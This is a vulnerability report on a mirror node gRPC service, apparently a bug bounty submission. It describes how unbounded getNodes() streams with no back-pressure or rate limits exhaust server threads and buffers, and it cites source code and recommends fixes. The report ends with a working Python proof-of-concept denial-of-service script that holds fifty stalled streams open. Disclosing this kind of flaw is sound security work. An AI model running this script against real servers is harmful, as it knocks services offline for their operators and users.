### Title
Unbounded Concurrent `getNodes()` Streams with No Back-Pressure or Rate Limiting Enables Resource Exhaustion

### Summary
`NetworkController.getNodes()` subscribes to the Flux pipeline using `.subscribe()` which requests `Long.MAX_VALUE` items with no back-pressure signaling, and never checks `ServerCallStreamObserver.isReady()` before writing. Combined with the complete absence of per-IP connection limits or any rate limiting on the gRPC endpoint, an unauthenticated attacker can open many connections and hold concurrent slow-consumer streams, exhausting the `boundedElastic` thread pool and gRPC write buffers.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` at [1](#0-0)  calls `.subscribe(responseObserver::onNext, ...)` directly on the Flux. In Project Reactor, a bare `.subscribe()` issues an unbounded demand (`Long.MAX_VALUE`) to the upstream, meaning the pipeline produces items as fast as it can with no downstream back-pressure signal.

`NetworkServiceImpl.getNodes()` at [2](#0-1)  uses `repeatWhen` with `Schedulers.boundedElastic()` to page through the address book. Each active stream occupies a slot in the `boundedElastic` pool during the `pageDelay` (minimum 250 ms per [3](#0-2) ) and issues a DB query per page.

**No `isReady()` check exists anywhere in the gRPC module** (confirmed by search). Items are pushed to `responseObserver::onNext` unconditionally. When the gRPC client is a slow consumer, the Netty write buffer accumulates serialized `NodeAddress` messages without bound until gRPC's own flow-control window fills.

**No rate limiting or connection limit on the gRPC endpoint.** The only server-side guard is `maxConcurrentCallsPerConnection = 5` at [4](#0-3) , applied per connection at [5](#0-4) . There is no limit on the number of connections, no per-IP throttle, and no global call rate limit for the gRPC service (the `ThrottleConfiguration` / `ThrottleManagerImpl` exists only in the `web3` module, not in `grpc`).

**Root cause:** The failed assumption is that gRPC's transport-layer flow control will propagate back-pressure into the Reactor pipeline. It does not — the Flux keeps emitting and calling `onNext`, which queues into gRPC's internal write buffer. The `onCancelHandler` at [6](#0-5)  only fires on explicit client cancellation, not on a slow consumer that simply stops reading.

### Impact Explanation

An attacker opens `N` TCP connections and issues 5 concurrent `getNodes()` calls per connection (the per-connection maximum), acting as a slow consumer on each. Each stream:
- Holds a `boundedElastic` scheduler thread during every 250 ms `pageDelay` interval.
- Holds a DB connection for each page query.
- Accumulates serialized `NodeAddress` protobuf messages in the Netty write buffer.

The `boundedElastic` pool defaults to `10 × CPU cores` threads (e.g., 40 on a 4-core pod). With `N = 8` connections, all 40 threads are occupied, starving every other reactive operation on the server (topic subscriptions, health checks, etc.). Memory pressure from accumulated gRPC write buffers across `5N` streams compounds this. No privilege is required.

### Likelihood Explanation

The attack requires only a standard gRPC client library (e.g., `grpc-java`, `grpcurl`). Opening many TCP connections and issuing streaming RPCs without reading responses is trivial. The endpoint is publicly reachable (port 5600, no authentication). The attacker does not need to know any internal state — `file_id` values `0.0.101` / `0.0.102` are documented in the proto at [7](#0-6) . The attack is repeatable and requires no special tooling.

### Recommendation

1. **Add `isReady()` gating**: Replace the bare `.subscribe()` with a back-pressure-aware pattern that checks `ServerCallStreamObserver.isReady()` and pauses emission when the transport buffer is full (use `setOnReadyHandler` + `onBackpressureLatest()`/`onBackpressureDrop()`).
2. **Add a global concurrent-call limit**: Configure `NettyServerBuilder.maxConnectionAge` and a global `maxConcurrentCalls` (not just per-connection) in `GrpcConfiguration`.
3. **Add per-IP or global rate limiting**: Apply a `ServerInterceptor` (similar to the `ThrottleManagerImpl` pattern in `web3`) that limits `getNodes()` calls per second globally or per source IP.
4. **Add a stream timeout**: Apply `.timeout(Duration)` on the Flux before `.subscribe()` so stalled streams are terminated server-side.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import network_service_pb2, network_service_pb2_grpc
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 10
CALLS_PER_CONN = 5  # maxConcurrentCallsPerConnection

def slow_consumer(stub):
    req = network_service_pb2.AddressBookQuery()
    req.file_id.fileNum = 102  # 0.0.102
    req.limit = 0              # no limit
    stream = stub.getNodes(req)
    # Open the stream but never call next() — slow consumer
    import time; time.sleep(300)

channels = [grpc.insecure_channel(TARGET) for _ in range(NUM_CONNECTIONS)]
stubs   = [network_service_pb2_grpc.NetworkServiceStub(ch) for ch in channels]

threads = []
for stub in stubs:
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=slow_consumer, args=(stub,))
        t.daemon = True
        t.start()
        threads.append(t)

# 50 concurrent stalled streams now hold boundedElastic threads and gRPC write buffers
for t in threads:
    t.join()
```

Running this exhausts the `boundedElastic` thread pool and gRPC write buffers, degrading or blocking all other streaming operations on the server.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L68-76)
```java
        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/AddressBookProperties.java (L32-34)
```java
    @DurationMin(millis = 100L)
    @NotNull
    private Duration pageDelay = Duration.ofMillis(250L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-33)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/network_service.proto (L16-17)
```text
  .proto.FileID file_id = 1; // The ID of the address book file on the network. Can be either 0.0.101 or 0.0.102.
  int32 limit = 2; // The maximum number of node addresses to receive before stopping. If not set or set to zero it will return all node addresses in the database.
```
